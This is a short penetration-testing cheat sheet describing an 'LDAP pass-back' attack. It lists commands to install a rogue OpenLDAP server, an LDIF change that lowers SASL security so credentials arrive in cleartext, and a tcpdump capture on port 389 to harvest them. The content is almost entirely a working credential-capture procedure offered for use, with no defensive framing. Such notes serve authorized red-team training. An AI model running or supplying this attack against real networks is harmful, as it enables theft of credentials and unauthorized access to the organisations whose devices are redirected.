# LDAP Pass-back
If we can access a device on a network that uses LDAP for authentication, we could possibly change the device to try and connect to our rogue LDAP server instead of the original.

##### Install Rouge LDAP Server 

```
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
```

##### Configure Supported Authentication 

```
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

-   **olcSaslSecProps:** Specifies the SASL security properties
-   **noanonymous:** Disables mechanisms that support anonymous login
-   **minssf:** Specifies the minimum acceptable security strength with 0, meaning no protection.

##### Launch Server

```
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
```

Check Supported Authentication

```
ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
```

##### Capture Credentials

```
sudo tcpdump -SX -i eth0 tcp port 389
```

##### Kill Server 

```
sudo service slapd stop
```